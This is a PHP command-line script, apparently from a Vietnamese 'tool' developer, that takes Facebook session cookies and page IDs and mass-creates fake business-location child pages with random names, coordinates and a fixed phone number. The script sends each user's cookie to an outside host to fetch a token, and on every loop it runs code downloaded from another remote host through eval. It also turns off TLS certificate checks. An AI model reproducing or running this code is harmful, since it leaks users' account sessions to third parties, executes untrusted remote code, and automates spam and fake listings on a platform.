<?php
error_reporting(0);
session_start();
date_default_timezone_set('Asia/Ho_Chi_Minh');
/***[ Color ]***/
$xnhac = "\033[1;36m";
$do = "\033[1;31m";
$luc = "\033[1;32m";
$vang = "\033[1;33m";
$xduong = "\033[1;34m";
$hong = "\033[1;35m";
$trang = "\033[1;37m";
$dodai = strlen($keyfree);
/***[ Đánh Dấu Bản Quyền ]***/
$thanh_xau = $trang."".$do."[".$luc."🍓".$do."] ".$trang."➩ ";
/***[Ngày]***/
$ip_2 = file_get_contents("https://api64.ipify.org/");
$Ngay = date("d/m");
$day= date('d-m-y');    
$today = date("d-m-y");
$d = date("d-m");
$thanhngang ="\n\033[1;37m- - - - - - - - - - - - - - - - - - - - - - - - - -\n";
$thanhngang1 ="\033[1;37m- - - - - - - - - - - - - - - - - - - - - - - - - -\n";
/***[ Banner ]***/
$banner = $vang."
\033[1;37m████████╗██╗  ██╗ ██████╗  █████╗ ██╗    ██████╗ ███████╗██╗   ██╗
\033[1;37m╚══██╔══╝██║  ██║██╔═══██╗██╔══██╗██║    ██╔══██╗██╔════╝██║   ██║
\033[1;37m   ██║   ███████║██║   ██║███████║██║    ██║  ██║█████╗  ██║   ██║
\033[1;37m   ██║   ██╔══██║██║   ██║██╔══██║██║    ██║  ██║██╔══╝  ╚██╗ ██╔╝
\033[1;37m   ██║   ██║  ██║╚██████╔╝██║  ██║██║    ██████╔╝███████╗ ╚████╔╝ 
\033[1;37m   ╚═╝   ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝╚═╝    ╚═════╝ ╚══════╝  ╚═══╝  
                                                                  
\033[1;37m- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
\033[1;34mYoutube: \033[1;35mRised Media
\033[1;33mZalo: \033[1;36mĐang Update.
\033[1;32mHôm Nay Ngày: \033[1;33m$d-2022
\033[1;31mIP Của Bạn: \033[1;37m$ip_2
\033[1;37m- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -                                    
                                                                    \n";

$list_cookiefb = [];
$list_idpageme = [];
$list_token_con = [];
$list_tenfb = [];
$list_idfb = [];
 @system('clear');
for($i = 0; $i < strlen($banner); $i++){echo $banner[$i];usleep(5000);}
echo $thanh_xau."\033[1;32mLink kiểm tra Page:\033[1;97m https://business.facebook.com/business_locations?page_id= \n";
echo $thanh_xau."\033[1;32mNhập Cookie Facebook muốn dừng ấn\033[1;97m Enter\033[1;93m\n";
$iii = 0;
$iii = 0;
$_iid = 0;
while (true) {
    $iii++;
    echo $thanh_xau."\033[1;32mNhập Cookie thứ\033[1;97m " . $iii . " :\033[1;93m ";
    $cookiefb = trim(fgets(STDIN));
    if (strlen($cookiefb) < 5) {
        break;
    }
    echo $thanh_xau."\033[1;32mNhập id PAGE mẹ muốn dừng ấn\033[1;97mEnter\033[1;93m\n";
    while(true){
        $_iid++;
        echo $thanh_xau."\033[1;32mNhập id PAGE mẹ thứ\033[1;97m " . $_iid . " :\033[1;93m ";
        $idpageme = trim(fgets(STDIN));
        if (strlen($idpageme) < 3) {
            break;
        }
        if($_iid < 2){
            $check = req("https://graph.facebook.com/me/?fields=id,name&access_token=" . $token_me, $cookiefb);
            $check2 = json_decode($check, true);
            if (strpos($check, 'id') == true) {
                $idfb = $check2["id"];
                $tenfb = $check2["name"];
            }
            $token_me =  file_get_contents("https://thuongdz.name.vn/Api_tds/func_fb.php?get_token=EAAG&cookie=" . urlencode($cookiefb));
        }
        $token_con_ = req('https://graph.facebook.com/v3.1/' . $idpageme . '?fields=access_token&access_token=' . $token_me, $cookiefb);
        if (strpos($token_con_, "EAAG") == true) {
            $token_con = json_decode($token_con_, true)["access_token"];
        } else {
            $token_con = "";
            echo ("\033[1;91mID Page Mẹ Sai Hoặc Chưa Đăng Trang. Kiểm Tra Lại\n");
        }
        if ($idpageme != "" and $token_con != "") {
            array_push($list_cookiefb, $cookiefb);
            array_push($list_idpageme, $idpageme);
            array_push($list_token_con, $token_con);
            array_push($list_tenfb, $tenfb);
            array_push($list_idfb, $idfb);
        } else {
            $iii--;
        }
    }
    $_iid = 0;
    echo $thanhngang1;
}
$SEC = "500";

system("clear");
for($i = 0; $i < strlen($banner); $i++){echo $banner[$i];usleep(5000);}
echo $thanh_xau."\033[1;32mSố Fanpage mẹ đã thêm: " . $trang . count($list_idpageme) . "\n";
echo $thanh_xau."\033[1;32mNhập tên Fanpage con: " . $vang;
$name_page = trim(fgets(STDIN));
$name_page = $name_page;
echo $thanh_xau."\033[1;32mNhập delay (" . $trang . "Lớn hơn 150" . $luc . "): " . $vang;
$SEC = trim(fgets(STDIN));
echo $trang."- - - - - - - - - - - - - - - - - - - - - - - - - -\n" ;
$dem = 1;
while (true) {
    for ($_i = 0; $_i < count($list_idpageme); $_i++) {
        while (true) {
            if ($sock = @fsockopen('www.google.com', 80)) {
                $idpageme = $list_idpageme[$_i];
                $cookiefb = $list_cookiefb[$_i];
                $token_con = $list_token_con[$_i];
                $ten_fb = $list_tenfb[$_i];
                $id_fb = $list_idfb[$_i];
                $code = eval(file_get_contents("https://www.tranthuongtv.name.vn/api_/reg_page_c"));
                $don = reg_page_c($idpageme, $name_page . "_", $cookiefb, $token_con);
                if (strpos($don, 'error') == false) {
                    $id = json_decode($don, true)["id"];
                    if ($id != "") {
                        $dem_die_id = 0;
                        $t = date('H:i:s');
                        echo "\033[1;91m|\033[1;93m" . $dem++ . "\033[1;91m|\033[1;91m | \033[1;96m" . $t . "\033[1;91m |\033[1;91m |\033[3;92m " . $name_page . "\033[0m\033[1;91m | \033[1;93m" . $id . "\033[0m\033[1;91m | \033[1;93m".$ten_fb."\n";
                        DELAY($SEC);
                        unset($don);
                        break;
                    } else {
                        $dem_die_id++;
                    }
                    if ($dem_die_id > 10) {
                        echo "\033[1;91mCookie " . $vang . $ten_fb . $do . " ID: " . $trang . $id_fb . $do . " die.... \n";
                        break;
                    }
                } else {
                    echo "\033[1;97mLOADING...      \r";
                    DELAY($SEC);
                    unset($don);
                    break;
                }
            }
        }
    }
}

function req($url, $cookie)
{
    $ch   = curl_init();
    curl_setopt_array(
        $ch,
        array(
            CURLOPT_URL => $url,
            CURLOPT_CUSTOMREQUEST => "GET",
            CURLOPT_FOLLOWLOCATION => TRUE,
            CURLOPT_RETURNTRANSFER => 1,
            CURLOPT_SSL_VERIFYPEER => 0,
            CURLOPT_HTTPHEADER =>
            array(
                "Cookie:" . $cookie,
            ),
            CURLOPT_SSL_VERIFYPEER => FALSE,
            CURLOPT_ENCODING => TRUE,
        )
    );
    $ch = curl_exec($ch);
    return $ch;
}


function DELAY($SEC)
{
    for ($tt = $SEC; $tt >= 1; $tt--) {
        echo "\r\033[1;33m   Thoai Dev    \033[1;32m LO      \033[1;31m >   | $tt | ";
        usleep(150000);
        echo "\r\033[1;31m   Thoai Dev    \033[0;37m LOA     \033[0;31m >>  | $tt | ";
        usleep(150000);
        echo "\r\033[1;32m   Thoai Dev>   \033[0;37m LOAD    \033[0;31m >>> | $tt | ";
        usleep(150000);
        echo "\r\033[1;34m   Thoai Dev ~> \033[0;37m LOADI   \033[0;31m >   | $tt | ";
        usleep(150000);
        echo "\r\033[1;35m   Thoai Dev  ~>\033[0;37m LOADIN  \033[0;31m >>  | $tt | ";
        usleep(150000);
        echo "\r\033[1;35m   Thoai Dev  ~>\033[0;37m LOADING \033[0;31m >>> | $tt | ";
        usleep(150000);
        echo "\r\033[1;35m   Thoai Dev  ~>\033[0;37m LOADING.\033[0;31m | $tt | ";
        usleep(150000);
    }
    echo "\r\e[1;95m    Thoai Dev            \r";
}




function reg_page_c($idpageme, $name_page, $cookiefb, $token_con)
{   
    
    $number   = rand(0, 9999999999);
    $name_page = $name_page . $number;
    $data = [
        '_reqName' => 'object:page/locations',
        '_reqSrc' => 'LocationManagerUtils',
        'always_open' => 'false',
        'differently_open_offerings' => '{}',
        'id' => $idpageme,
        'ignore_warnings' => 'true',
        'is_franchise' => 'false',
        'locale' => 'vi_VN',
        'location' => '{"city_id":2590099,"latitude":"10.' . rand(0, 99999) . '","longitude":"104.' . rand(0, 99999) . '","street":"' . $name_page . '","zip":"10000"}',
        'method' => 'post',
        'permanently_closed' => 'false',
        'phone' => '+84982242243',
        'pickup_options' => '[]',
        'place_topics' => '["123377808095874","530553733821238"]',
        'pretty' => '0',
        'store_name' => $name_page,
        'store_number' => rand(0, 1789273828),
        'suppress_http_code' => '1',
    ];
    $data = http_build_query($data);
    $ch   = curl_init();
    curl_setopt_array(
        $ch,
        array(
            CURLOPT_URL => 'https://graph.facebook.com/v11.0/' . $idpageme . '/locations?access_token=' . $token_con,
            CURLOPT_CUSTOMREQUEST => "POST",
            CURLOPT_FOLLOWLOCATION => TRUE,
            CURLOPT_RETURNTRANSFER => 1,
            CURLOPT_SSL_VERIFYPEER => 0,
            CURLOPT_HTTPHEADER =>
            array(
                "content-type:application/x-www-form-urlencoded",
                "Cookie:" . $cookiefb,
            ),
            CURLOPT_SSL_VERIFYPEER => FALSE,
            CURLOPT_POSTFIELDS => $data,
            CURLOPT_ENCODING => TRUE,
        )
    );
    $ch = curl_exec($ch);
    return $ch;
}


function id_page_me($cookie)
{
    $useragent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36';
    $head = array("Connection: keep-alive", "Keep-Alive: 300", "authority: business.facebook.com", "ccept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7", "accept-language: vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5", "cache-control: max-age=0", "upgrade-insecure-requests: 1", "accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "sec-fetch-site: none", "sec-fetch-mode: navigate", "sec-fetch-user: ?1", "sec-fetch-dest: document");
    $ch = curl_init();
    curl_setopt_array($ch, array(
        CURLOPT_URL => "https://business.facebook.com/business_locations",
        CURLOPT_USERAGENT => $useragent,
        CURLOPT_COOKIE => $cookie,
        CURLOPT_HTTPHEADER => $head,
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_SSL_VERIFYPEER => FALSE,
        CURLOPT_TIMEOUT => 60,
        CURLOPT_CONNECTTIMEOUT => 60,
        CURLOPT_FOLLOWLOCATION => TRUE
    ));
    $access = curl_exec($ch);
    curl_close($ch);
    $id = explode('URL=/business_locations/?page_id=', $access)[1];
    $id = explode('&', $id)[0];
    return $id;
}